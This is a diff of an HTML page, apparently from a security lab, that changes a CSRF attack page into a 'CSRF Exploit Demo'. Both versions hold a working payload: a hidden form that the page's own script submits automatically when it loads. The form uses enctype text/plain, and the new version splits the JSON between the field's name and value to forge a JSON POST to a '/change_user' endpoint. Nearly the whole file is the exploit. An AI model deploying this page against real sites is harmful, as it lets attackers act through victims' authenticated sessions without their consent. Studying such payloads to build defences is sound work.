@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-  <title>Malicious Page</title>
+  <title>CSRF Exploit Demo</title>
 </head>
-
 <body>
-  <h1>Welcome to the Malicious Page</h1>
-  <p>If you see this, you might be at risk!</p>
-  <form id="csrf" action="http://ptl-c14f5df8-12d471f9.libcurl.so/share" method="POST" enctype="text/plain">
-    <input type="hidden" name="data" value='{"user":"test","id":"0"}'>
+  <h1>CSRF Exploit Demo</h1>
+  <p>This page demonstrates a Cross-Site Request Forgery attack.</p>
+
+  <form id="csrf" action="http://example/change_user" method="POST" enctype="text/plain">
+    <input type="hidden" name='{"user":"test","id":"0"' value='}'>
   </form>
+
   <script>
-    document.getElementById("csrf").submit();
+    // Automatically submit the form to exploit the CSRF vulnerability
+    document.getElementById('csrf').submit();
   </script>
 </body>
-
 </html>
